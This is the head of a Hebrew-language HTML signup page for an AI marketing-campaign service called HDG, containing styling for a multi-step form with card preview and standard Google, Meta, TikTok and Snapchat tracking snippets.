<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HDG — הקמת קמפיין שיווק דיגיטלי מבוסס AI</title>
<meta name="description" content="HDG: הקמת קמפיין שיווק אוטומטי לעסק שלך. הגדרת יעד, תקציב וקבלת תוצאות בלי צורך בידע מוקדם בדיגיטל.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600;700;800;900&family=Assistant:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
<style>
  /* ================= RESET & BASE ================= */
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html { scroll-behavior: smooth; }
  @media (prefers-reduced-motion: reduce) {
    html { scroll-behavior: auto; }
    *, *::before, *::after {
      animation-duration: 0.01ms !important;
      animation-iteration-count: 1 !important;
      transition-duration: 0.01ms !important;
      scroll-behavior: auto !important;
    }
  }
  img, svg { display: block; max-width: 100%; }
  a { color: inherit; text-decoration: none; }
  button { font: inherit; cursor: pointer; border: none; background: none; color: inherit; }
  ul { list-style: none; }
  input, select, textarea { font: inherit; color: inherit; }

  :root {
    /* Meta / Facebook / WhatsApp Colors */
    --meta-blue: #1877F2;
    --meta-blue-hover: #166FE5;
    --meta-blue-light: rgba(24, 119, 242, 0.08);
    --whatsapp-green: #25D366;
    --whatsapp-green-dark: #075E54;
    --whatsapp-teal: #128C7E;
    
    --paper: #F0F2F5; /* Facebook Light Background */
    --paper-card: #FFFFFF;
    --ink: #1C1E21; /* Facebook Dark Ink */
    --slate: #65676B; /* Facebook Secondary Text */
    --slate-light: #8D949E; /* Facebook Muted Text */
    --line-light: #CED0D4; /* Facebook Card Border */
    --line-dark: rgba(255, 255, 255, 0.15);
    
    --error: #FA3E3E;
    --success: #25D366;

    /* Native Meta-style system fonts */
    --font-display: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Heebo';
    --font-body: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Assistant';
    --font-mono: 'IBM Plex Mono', monospace;

    --radius-sm: 8px;
    --radius-md: 12px;
    --radius-lg: 16px; /* Native Meta rounded corners */
    --container: 1180px;
  }

  body {
    font-family: var(--font-body);
    background: var(--paper);
    color: var(--ink);
    line-height: 1.6;
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
  }
  .wrap { max-width: var(--container); margin: 0 auto; padding: 0 24px; }
  h1, h2, h3, h4 { font-family: var(--font-display); letter-spacing: -0.01em; }
  .num { font-family: var(--font-mono); }

  a:focus-visible, button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-visible {
    outline: 2px solid var(--meta-blue);
    outline-offset: 3px;
  }

  .skip-link {
    position: absolute; right: 16px; top: -60px;
    background: var(--meta-blue); color: #fff;
    padding: 10px 18px; border-radius: var(--radius-sm);
    font-weight: 700; z-index: 999; transition: top .2s ease;
  }
  .skip-link:focus { top: 16px; }

  /* ================= BUTTONS ================= */
  .btn {
    display: inline-flex; align-items: center; justify-content: center; gap: 10px;
    padding: 13px 26px; border-radius: 6px;
    font-weight: 700; font-size: 15px; font-family: var(--font-body);
    transition: all .15s ease-in-out;
    white-space: nowrap;
  }
  .btn svg { width: 16px; height: 16px; flex-shrink: 0; transition: transform .18s ease; }
  
  .btn-primary { background: var(--meta-blue); color: #fff; }
  .btn-primary:hover { background: var(--meta-blue-hover); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2); }
  .btn-primary:hover svg { transform: translateX(-4px); }
  
  .btn-whatsapp { background: var(--whatsapp-green); color: #fff; }
  .btn-whatsapp:hover { background: #20ba5a; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(37, 211, 102, 0.2); }
  
  .btn-ghost { color: var(--slate); font-weight: 600; }
  .btn-ghost:hover { color: var(--ink); background: rgba(0, 0, 0, 0.05); }
  
  .btn-secondary { border: 1px solid var(--line-light); color: var(--ink); background: #fff; }
  .btn-secondary:hover { border-color: var(--meta-blue); background: var(--meta-blue-light); }

  /* ================= HEADER ================= */
  header {
    background: #FFFFFF; color: var(--ink);
    border-bottom: 1px solid var(--line-light);
    position: sticky; top: 0; z-index: 100;
    box-shadow: 0 2px 4px rgba(0,0,0,0.04);
  }
  nav.wrap { display: flex; align-items: center; justify-content: space-between; height: 64px; }
  .logo { display: flex; align-items: center; gap: 10px; }
  .logo-mark { width: 28px; height: 28px; }
  .logo-word { font-family: var(--font-display); font-weight: 800; font-size: 19px; color: var(--ink); display: flex; align-items: center; gap: 6px; }
  .logo-badge { font-size: 10px; font-weight: 700; background: var(--paper); color: var(--slate); padding: 3px 8px; border-radius: 12px; border: 1px solid var(--line-light); }
  .header-right { display: flex; align-items: center; gap: 20px; }
  .back-link { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; color: var(--slate); transition: color .15s ease; }
  .back-link:hover { color: var(--meta-blue); }
  .back-link svg { width: 15px; height: 15px; }
  .secure-badge {
    display: flex; align-items: center; gap: 7px;
    font-family: var(--font-mono); font-size: 11.5px; color: var(--slate);
    background: var(--paper); border: 1px solid var(--line-light); padding: 6px 12px; border-radius: 20px;
  }
  .secure-badge svg { width: 13px; height: 13px; color: var(--meta-blue); }

  /* ================= LAYOUT CONTAINER ================= */
  .layout-grid {
    display: grid; grid-template-columns: 1.35fr 1fr; gap: 36px; margin-top: 36px; margin-bottom: 80px;
    align-items: start;
  }

  .form-hero { padding: 40px 0 0; text-align: center; }
  .form-hero h1 { font-size: clamp(26px, 3.8vw, 36px); font-weight: 800; margin-bottom: 12px; color: var(--ink); }
  .form-hero p { color: var(--slate); font-size: 16px; max-width: 580px; margin: 0 auto; }

  /* ================= STEPPER ================= */
  .stepper-bar {
    background: #fff; border: 1px solid var(--line-light); border-radius: var(--radius-lg);
    padding: 16px 20px; display: flex; justify-content: space-between; align-items: center;
    margin-bottom: 20px; position: relative; overflow: hidden;
  }
  .stepper-progress {
    position: absolute; bottom: 0; right: 0; height: 3px; background: var(--meta-blue);
    width: 25%; transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1);
  }
  .stepper-step-info { display: flex; flex-direction: column; }
  .stepper-step-info .step-label { font-size: 12px; color: var(--slate); font-weight: 600; font-family: var(--font-mono); }
  .stepper-step-info .step-title { font-size: 17px; color: var(--ink); font-weight: 800; }
  .stepper-dots { display: flex; gap: 6px; }
  .stepper-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--line-light); transition: background .3s ease; }
  .stepper-dot.active { background: var(--meta-blue); }
  .stepper-dot.completed { background: var(--ink); }

  /* ================= FORM CARD ================= */
  .form-card {
    background: var(--paper-card); border: 1px solid var(--line-light);
    border-radius: var(--radius-lg); padding: 36px;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
  }
  .form-step { display: none; }
  .form-step.active { display: block; animation: stepIn .4s cubic-bezier(0.16, 1, 0.3, 1); }
  @keyframes stepIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
  
  .step-head { margin-bottom: 24px; }
  .step-head h2 { font-size: 21px; font-weight: 800; color: var(--ink); margin-bottom: 6px; }
  .step-head p { color: var(--slate); font-size: 14.5px; }

  /* ================= FIELD GROUPS ================= */
  .field-group { margin-bottom: 20px; }
  .field-label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 6px; color: var(--ink); }
  .field-label .req { color: var(--error); margin-right: 2px; }
  .field-label .opt { color: var(--slate); font-weight: 400; font-size: 12px; }
  .field-input {
    width: 100%; padding: 12px 14px; border-radius: 6px;
    border: 1px solid var(--line-light); background: #F5F6F7;
    font-size: 15px; color: var(--ink); transition: border-color .15s ease, background .15s ease;
  }
  .field-input::placeholder { color: var(--slate-light); }
  .field-input:focus { outline: none; border-color: var(--meta-blue); background: #fff; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15); }
  .field-input.invalid { border-color: var(--error); background: rgba(250, 62, 62, 0.02); }
  .field-error { display: none; color: var(--error); font-size: 13px; font-weight: 600; margin-top: 5px; }
  .field-error.show { display: block; }
  .field-hint { color: var(--slate); font-size: 12.5px; margin-top: 5px; display: block; }

  /* ================= CATEGORY SELECTOR ================= */
  .category-grid {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; margin-bottom: 18px;
  }
  .category-card {
    position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center;
    padding: 14px 8px; border: 1px solid var(--line-light); border-radius: var(--radius-md);
    cursor: pointer; text-align: center; transition: all .15s ease; background: #fff;
  }
  .category-card:hover { border-color: var(--meta-blue); background: var(--meta-blue-light); }
  .category-radio { position: absolute; opacity: 0; width: 0; height: 0; }
  .category-card:has(.category-radio:checked) {
    border-color: var(--meta-blue); background: var(--meta-blue-light);
    box-shadow: 0 0 0 2px var(--meta-blue);
  }
  .category-icon { width: 28px; height: 28px; color: var(--slate); margin-bottom: 8px; transition: color .15s ease; }
  .category-card:has(.category-radio:checked) .category-icon { color: var(--meta-blue); }
  .category-name { font-size: 13px; font-weight: 700; color: var(--ink); }

  /* ================= GOAL & TARGET CARDS ================= */
  .goal-selector { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
  .goal-card {
    position: relative; display: flex; align-items: center; gap: 14px;
    padding: 14px 18px; border: 1px solid var(--line-light); border-radius: var(--radius-md);
    cursor: pointer; transition: all .15s ease; background: #fff;
  }
  .goal-card:hover { border-color: var(--meta-blue); }
  .goal-radio { position: absolute; opacity: 0; width: 0; height: 0; }
  .goal-card:has(.goal-radio:checked) {
    border-color: var(--meta-blue); background: var(--meta-blue-light);
    box-shadow: 0 0 0 1px var(--meta-blue);
  }
  .goal-check {
    width: 18px; height: 18px; border-radius: 50%; border: 2px solid var(--line-light);
    display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: all .15s ease;
  }
  .goal-check::after { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--meta-blue); opacity: 0; transition: opacity .12s ease; }
  .goal-card:has(.goal-radio:checked) .goal-check { border-color: var(--meta-blue); }
  .goal-card:has(.goal-radio:checked) .goal-check::after { opacity: 1; }
  .goal-info { flex: 1; }
  .goal-title { font-size: 15px; font-weight: 700; color: var(--ink); margin-bottom: 2px; }
  .goal-desc { font-size: 12.5px; color: var(--slate); }

  .goal-detail-input {
    margin-top: -10px; margin-bottom: 16px; padding: 14px; border: 1px solid var(--meta-blue);
    border-top: none; border-bottom-left-radius: var(--radius-md); border-bottom-right-radius: var(--radius-md);
    background: var(--meta-blue-light); animation: slideDown 0.25s ease;
  }
  @keyframes slideDown { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }

  /* ================= BUDGET SLIDER ================= */
  .budget-container { background: #F5F6F7; border-radius: var(--radius-md); padding: 20px; margin-bottom: 20px; border: 1px solid var(--line-light); }
  .budget-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
  .budget-display { display: flex; align-items: baseline; gap: 2px; }
  .budget-value { font-family: var(--font-mono); font-size: 34px; font-weight: 800; color: var(--ink); }
  .budget-period { font-size: 13.5px; color: var(--slate); font-weight: 600; }

  /* Custom Slider Styling */
  .slider-wrapper { position: relative; margin: 20px 0; }
  .custom-slider {
    -webkit-appearance: none; width: 100%; height: 6px; border-radius: 3px;
    background: var(--line-light); outline: none;
  }
  .custom-slider::-webkit-slider-thumb {
    -webkit-appearance: none; width: 22px; height: 22px; border-radius: 50%;
    background: var(--meta-blue); border: 2px solid #fff; cursor: pointer;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15); transition: transform 0.1s ease;
  }
  .custom-slider::-webkit-slider-thumb:hover { transform: scale(1.1); background: var(--meta-blue-hover); }
  .custom-slider::-moz-range-thumb {
    width: 22px; height: 22px; border-radius: 50%;
    background: var(--meta-blue); border: 2px solid #fff; cursor: pointer;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15); transition: transform 0.1s ease;
  }
  .custom-slider::-moz-range-thumb:hover { transform: scale(1.1); background: var(--meta-blue-hover); }

  .slider-labels { display: flex; justify-content: space-between; color: var(--slate); font-size: 12px; font-family: var(--font-mono); }

  /* AI Recommendation widget */
  .ai-recommendation-box {
    background: linear-gradient(135deg, rgba(24,119,242,0.06), rgba(147,51,234,0.06)); color: var(--ink);
    border-radius: var(--radius-md); padding: 18px; margin-bottom: 20px; position: relative;
    border: 1px solid rgba(24, 119, 242, 0.18);
  }
  .ai-rec-header { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-weight: 700; color: var(--meta-blue); font-size: 14px; }
  .ai-rec-header svg { width: 18px; height: 18px; }
  .ai-rec-text { font-size: 13.5px; color: var(--ink); margin-bottom: 12px; line-height: 1.5; }
  .ai-rec-action { display: inline-flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; color: var(--meta-blue); cursor: pointer; }
  .ai-rec-action:hover { color: var(--meta-blue-hover); text-decoration: underline; }

  /* Dynamic performance estimation */
  .estimation-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
  .estimation-card {
    background: #fff; border: 1px solid var(--line-light); border-radius: var(--radius-md); padding: 16px;
    display: flex; flex-direction: column;
  }
  .est-label { font-size: 12px; color: var(--slate); margin-bottom: 4px; }
  .est-val { font-family: var(--font-display); font-size: 17px; font-weight: 800; color: var(--ink); }
  .est-val.highlight { color: #10B981; }

  /* Transparent pricing breakdown */
  .pricing-breakdown { border-top: 1px solid var(--line-light); padding-top: 16px; margin-top: 16px; }
  .price-row { display: flex; justify-content: space-between; font-size: 13.5px; color: var(--slate); margin-bottom: 6px; }
  .price-row.total { font-size: 16px; font-weight: 800; color: var(--ink); border-top: 1px dashed var(--line-light); padding-top: 8px; margin-top: 6px; }

  /* ================= LIVE CARD PREVIEW ================= */
  .card-container {
    perspective: 1000px; max-width: 320px; margin: 0 auto 24px;
  }
  .credit-card {
    width: 100%; height: 180px; position: relative; transform-style: preserve-3d;
    transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer;
  }
  .credit-card.flipped { transform: rotateY(180deg); }
  .card-face {
    position: absolute; inset: 0; border-radius: 12px; padding: 20px;
    backface-visibility: hidden; display: flex; flex-direction: column; justify-content: space-between;
    color: #fff; 
    /* Meta ads inspired neon/purple/blue gradient */
    background: linear-gradient(135deg, #0064E0 0%, #7F3DD8 55%, #FF007F 100%);
    border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 8px 20px rgba(0, 100, 224, 0.15);
  }
  .card-face::before {
    content: ''; position: absolute; inset: 0;
    background-image: linear-gradient(rgba(255,255,255,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.06) 1px, transparent 1px);
    background-size: 18px 18px;
    mask-image: radial-gradient(ellipse 90% 90% at 100% 0%, black 20%, transparent 100%);
    -webkit-mask-image: radial-gradient(ellipse 90% 90% at 100% 0%, black 20%, transparent 100%);
  }
  .card-front { z-index: 2; transform: rotateY(0deg); }
  .card-back { transform: rotateY(180deg); display: flex; flex-direction: column; justify-content: space-between; padding-inline: 0; }
  .card-magnetic-strip { width: 100%; height: 38px; background: rgba(0,0,0,0.85); margin-top: 8px; }
  .card-signature-box { display: flex; justify-content: flex-end; align-items: center; padding: 0 20px; }
  .card-signature { width: 70%; height: 32px; background: #fff; border-radius: 4px; display: flex; align-items: center; justify-content: flex-end; padding-right: 12px; color: #000; font-family: var(--font-mono); font-weight: 600; font-size: 14px; letter-spacing: 0.1em; }
  
  .card-logo-row { display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 2; }
  .card-chip { width: 34px; height: 24px; border-radius: 4px; background: linear-gradient(135deg, #F0C878, #1877F2); }
  .card-brand-logo { font-family: var(--font-mono); font-weight: 800; font-size: 13px; color: #fff; letter-spacing: 0.05em; }
  .card-number-disp { font-family: var(--font-mono); font-size: 16px; letter-spacing: 0.06em; text-align: left; direction: ltr; margin: 18px 0 6px; position: relative; z-index: 2; }
  .card-bottom-row { display: flex; justify-content: space-between; align-items: flex-end; font-family: var(--font-mono); font-size: 10px; color: rgba(255,255,255,0.7); text-transform: uppercase; position: relative; z-index: 2; }
  .card-holder-disp span, .card-expiry-disp span { display: block; color: #fff; font-size: 12.5px; margin-top: 2px; min-height: 15px; }

  /* ================= NAV BUTTONS ================= */
  .form-nav { display: flex; align-items: center; justify-content: space-between; margin-top: 28px; padding-top: 20px; border-top: 1px solid var(--line-light); }
  .form-nav .spacer { flex: 1; }

  /* ================= AI LIVE PREVIEW PANEL ================= */
  .ai-preview-panel {
    position: sticky; top: 100px; background: #fff; border: 1px solid var(--line-light);
    border-radius: var(--radius-lg); overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.05);
  }
  .preview-header {
    background: #FFFFFF; color: var(--ink); padding: 16px 20px;
    display: flex; align-items: center; justify-content: space-between;
    border-bottom: 1px solid var(--line-light);
  }
  .preview-header h3 { font-size: 15px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
  .preview-header h3 svg { width: 18px; height: 18px; color: var(--meta-blue); }
  .preview-live-pulse { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--meta-blue); font-weight: 700; }
  .preview-pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--meta-blue); animation: pulseDot 1.5s infinite; }
  @keyframes pulseDot { 0% { opacity: 0.3; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.1); } 100% { opacity: 0.3; transform: scale(0.9); } }

  .preview-tabs { display: flex; background: #F5F6F7; border-bottom: 1px solid var(--line-light); }
  .preview-tab {
    flex: 1; text-align: center; padding: 12px; font-size: 13.5px; font-weight: 700; color: var(--slate);
    cursor: pointer; border-bottom: 3px solid transparent; transition: all .15s ease;
  }
  .preview-tab:hover { color: var(--ink); }
  .preview-tab.active { color: var(--meta-blue); border-bottom-color: var(--meta-blue); background: #fff; }

  .preview-content { padding: 20px; background: var(--paper-card); }
  .preview-card { display: none; }
  .preview-card.active { display: block; animation: stepIn 0.25s ease; }

  /* Google Ad Mockup */
  .google-ad {
    border: 1px solid #dadce0; border-radius: 8px; padding: 14px; background: #fff;
    font-family: Roboto, Arial, sans-serif; text-align: right;
  }
  .google-ad-header { display: flex; align-items: center; gap: 6px; font-size: 11.5px; color: #4d5156; margin-bottom: 6px; }
  .google-ad-sponsor { font-weight: 700; background: #f1f3f4; padding: 2px 6px; border-radius: 4px; font-size: 10.5px; }
  .google-ad-url { font-size: 11.5px; color: #202124; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; direction: ltr; text-align: right; }
  .google-ad-title { font-size: 17px; color: #1a0dab; font-weight: 400; margin-bottom: 4px; }
  .google-ad-desc { font-size: 13.5px; color: #4d5156; line-height: 1.45; }

  /* Facebook Ad Mockup */
  .facebook-ad {
    border: 1px solid #ced0d4; border-radius: 8px; background: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  }
  .fb-ad-header { display: flex; align-items: center; gap: 10px; padding: 10px 12px; }
  .fb-profile-img { width: 34px; height: 34px; border-radius: 50%; background: linear-gradient(135deg, #0064E0, #7F3DD8); display: flex; align-items: center; justify-content: center; color: #fff; font-family: var(--font-display); font-weight: 800; font-size: 13px; }
  .fb-profile-info { flex: 1; }
  .fb-profile-name { font-size: 13.5px; font-weight: 700; color: #050505; }
  .fb-ad-time { font-size: 11.5px; color: #65676b; display: flex; align-items: center; gap: 3px; }
  .fb-ad-time svg { width: 11px; height: 11px; }
  .fb-ad-text { font-size: 13.5px; color: #050505; padding: 0 12px 10px; line-height: 1.45; white-space: pre-line; }
  
  .fb-ad-media {
    aspect-ratio: 1.91 / 1; width: 100%; border-top: 1px solid #e5e5e5; border-bottom: 1px solid #e5e5e5;
    background: linear-gradient(135deg, #0064E0 0%, #7F3DD8 70%, #FF007F 100%); display: flex; align-items: center; justify-content: center;
    position: relative; overflow: hidden; padding: 16px; text-align: center;
  }
  .fb-ad-media-overlay {
    position: absolute; inset: 0; background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.15), transparent 75%);
  }
  .fb-ad-media-text {
    position: relative; z-index: 2; color: #fff; text-shadow: 0 1px 8px rgba(0,0,0,0.3);
  }
  .fb-ad-media-title { font-family: var(--font-display); font-size: 20px; font-weight: 900; color: #fff; margin-bottom: 2px; }
  .fb-ad-media-sub { font-size: 12.5px; color: #fff; opacity: 0.95; font-weight: 600; }

  .fb-ad-footer { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; background: #f0f2f5; }
  .fb-ad-footer-info { flex: 1; padding-left: 6px; }
  .fb-ad-footer-domain { font-size: 11px; color: #65676b; text-transform: uppercase; direction: ltr; text-align: right; }
  .fb-ad-footer-title { font-size: 14px; font-weight: 700; color: #050505; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .fb-ad-cta-btn {
    background: #e4e6eb; color: #050505; font-size: 13px; font-weight: 600; padding: 7px 11px; border-radius: 6px;
    white-space: nowrap; transition: background .12s ease;
  }
  .fb-ad-cta-btn:hover { background: #d8dadf; }

  .preview-empty-state { text-align: center; padding: 28px 12px; color: var(--slate); }
  .preview-empty-state svg { width: 44px; height: 44px; margin: 0 auto 12px; opacity: 0.6; color: var(--meta-blue); }

  /* ================= LOADER OVERLAY ================= */
  .loader-overlay {
    position: fixed; inset: 0; background: rgba(28,30,33,0.96); z-index: 1000;
    display: none; align-items: center; justify-content: center; color: #fff;
    padding: 24px;
  }
  .loader-overlay.active { display: flex; }
  .loader-card { max-width: 440px; width: 100%; text-align: center; }
  .loader-spinner-wrap { position: relative; width: 76px; height: 76px; margin: 0 auto 28px; }
  .loader-spinner {
    width: 100%; height: 100%; border: 3.5px solid rgba(255,255,255,0.08); 
    border-top-color: var(--meta-blue);
    border-radius: 50%; animation: spin 1s linear infinite;
  }
  .loader-sparkle {
    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
    width: 28px; height: 28px; color: var(--whatsapp-green);
  }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

  .loader-title { font-size: 23px; font-weight: 800; margin-bottom: 10px; color: #fff; }
  .loader-desc { color: var(--slate-light); font-size: 15px; margin-bottom: 28px; min-height: 22px; }
  
  .loader-steps { display: flex; flex-direction: column; gap: 12px; text-align: right; max-width: 300px; margin: 0 auto; }
  .loader-step { display: flex; align-items: center; gap: 10px; font-size: 14px; color: var(--slate-light); transition: color 0.25s ease; }
  .loader-step.active { color: #fff; font-weight: 700; }
  .loader-step.completed { color: var(--success); }
  .loader-step-dot {
    width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid var(--line-dark);
    display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 9.5px;
  }
  .loader-step.active .loader-step-dot { border-color: var(--meta-blue); background: var(--meta-blue); color: #fff; }
  .loader-step.completed .loader-step-dot { border-color: var(--success); background: var(--success); color: #fff; }
  .loader-step.completed .loader-step-dot svg { width: 10px; height: 10px; display: block; }
  .loader-step-dot svg { display: none; }

  /* ================= SUCCESS STATE ================= */
  .success-layout { display: none; text-align: center; padding: 40px 0; max-width: 580px; margin: 0 auto; }
  .success-layout.active { display: block; animation: stepIn .5s ease; }
  .success-badge-icon { width: 72px; height: 72px; margin: 0 auto 20px; color: var(--success); }
  .success-badge-icon circle { fill: none; stroke: var(--success); stroke-width: 3; }
  .success-badge-icon path { fill: none; stroke: var(--success); stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
  .success-layout h2 { font-size: 28px; font-weight: 800; color: var(--ink); margin-bottom: 10px; }
  .success-layout p { color: var(--slate); font-size: 16px; line-height: 1.6; margin-bottom: 28px; }

  .success-summary {
    background: #fff; border: 1px solid var(--line-light); border-radius: var(--radius-lg);
    padding: 20px; text-align: right; margin-bottom: 28px; box-shadow: 0 1px 2px rgba(0,0,0,0.02);
  }
  .success-summary-title { font-size: 15.5px; font-weight: 800; border-bottom: 1px solid var(--line-light); padding-bottom: 8px; margin-bottom: 14px; color: var(--ink); }
  .success-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 8px; }
  .success-row:last-child { margin-bottom: 0; }
  .success-row .label { color: var(--slate); }
  .success-row .value { font-weight: 700; color: var(--ink); }
  .success-row .value.highlight { color: var(--meta-blue); }

  footer { border-top: 1px solid var(--line-light); padding: 24px 0; text-align: center; color: var(--slate); font-size: 12.5px; margin-top: auto; }

  /* ================= RESPONSIVE ================= */
  @media (max-width: 1024px) {
    .layout-grid { grid-template-columns: 1fr; gap: 28px; }
    .ai-preview-panel { position: static; margin-top: 12px; }
  }
  @media (max-width: 768px) {
    .form-hero { padding: 20px 0 0; }
    .form-card { padding: 24px 18px; }
    .header-right .secure-badge { display: none; }
  }
  @media (max-width: 480px) {
    .layout-grid { margin-top: 20px; margin-bottom: 40px; }
    .form-nav { flex-direction: column-reverse; gap: 10px; }
    .form-nav .btn { width: 100%; }
    .category-grid { grid-template-columns: repeat(3, 1fr); gap: 6px; }
    .category-card { padding: 10px 4px; }
    .category-name { font-size: 11px; }
    .category-icon { width: 22px; height: 22px; margin-bottom: 4px; }
  }
</style>


<!-- ============================================================
     PRODUCTION TRACKING SUITE — HDG signup.php
     Platforms: Google Analytics 4, Google Ads, Meta (FB) Pixel,
                TikTok Pixel, Snapchat Pixel
     ============================================================ -->

<!-- GTM Body noscript — keep this after opening <body> tag instead -->
<!-- ① Google Tag Manager (HEAD snippet) -->
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-PXFMTZVD');</script>
<!-- End Google Tag Manager -->

<!-- ② Google Analytics 4 + Google Ads -->
<!-- REPLACE G-XXXXXXXXXX with your GA4 Measurement ID -->
<!-- REPLACE AW-XXXXXXXXXX with your Google Ads Conversion ID -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-604C3TGNEH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-604C3TGNEH', {
    page_title: document.title,
    page_location: window.location.href,
    send_page_view: true
  });
  gtag('config', 'AW-XXXXXXXXXX'); // Google Ads remarketing
</script>
<!-- End Google Analytics 4 / Google Ads -->

<!-- ③ Meta (Facebook) Pixel -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1509241624000686');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1509241624000686&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel -->

<!-- ④ TikTok Pixel -->
<!-- REPLACE XXXXXXXXXXXXXXXX with your TikTok Pixel ID -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=['page','track','identify','instances','debug','on','off','once','ready','alias','group','enableCookie','disableCookie'],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i='https://analytics.tiktok.com/i18n/pixel/events.js';ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement('script');o.type='text/javascript',o.async=!0,o.src=i+'?sdkid='+e+'&lib='+t;var a=document.getElementsByTagName('script')[0];a.parentNode.insertBefore(o,a)};
  ttq.load('XXXXXXXXXXXXXXXX');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- End TikTok Pixel -->

<!-- ⑤ Snapchat Pixel -->
<!-- REPLACE your-snapchat-pixel-id with your real Snap Pixel ID -->
<script type='text/javascript'>
(function(e,t,n){if(e.snaptr)return;var a=e.snaptr=function(){a.handleRequest?a.handleRequest.apply(a,arguments):a.queue.push(arguments)};a.queue=[];var s='script';r=t.createElement(s);r.async=!0;r.src=n;var u=t.getElementsByTagName(s)[0];u.parentNode.insertBefore(r,u);})(window,document,'https://sc-static.net/scevent.min.js');
snaptr('init', 'your-snapchat-pixel-id', { 'user_email': '' });
snaptr('track', 'PAGE_VIEW');
</script>
<!-- End Snapchat Pixel -->

</head>
<body>
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PXFMTZVD"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<a href="#main" class="skip-link">דלג לתוכן הראשי</a>

<header>
  <nav class="wrap" aria-label="ניווט">
    <a href="/" class="logo" aria-label="HDG – דף הבית">
